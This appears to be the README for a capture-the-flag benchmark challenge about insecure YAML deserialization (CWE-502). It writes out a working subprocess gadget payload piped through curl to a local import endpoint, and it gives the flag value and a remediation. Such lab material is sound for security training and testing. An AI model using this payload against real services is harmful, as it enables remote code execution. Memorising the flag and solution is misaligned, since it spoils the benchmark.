# aq-cloud-ben12 — ConfigLoader YAML RCE

## Vulnerability
- **Class:** Insecure deserialization (unsafe YAML load)
- **Category:** A08: Software & Data Integrity Failures
- **CWE:** CWE-502 (deserialization of untrusted data)

## Difficulty
hard — craft a YAML deserialization gadget for RCE

## Description
A config import API that parses submitted YAML with yaml.UnsafeLoader, allowing arbitrary object construction.

## Intended exploit path
1. Craft a YAML payload that runs a command reading ./flag.txt.
2. `printf '!!python/object/apply:subprocess.check_output [["cat","/app/flag.txt"]]' | curl -s localhost:8512/import --data-binary @-`
3. The `loaded` field returns the flag.

## Flag
`f13{yaml_unsafe_load_rce}` — in /app/flag.txt, read via the deserialization gadget

## Run
```bash
./bench up aq-cloud-ben12
# open http://localhost:<host_port>/
./bench down aq-cloud-ben12
```

## Remediation
Use yaml.safe_load (never UnsafeLoader/full_load on untrusted input); prefer plain data formats for config.
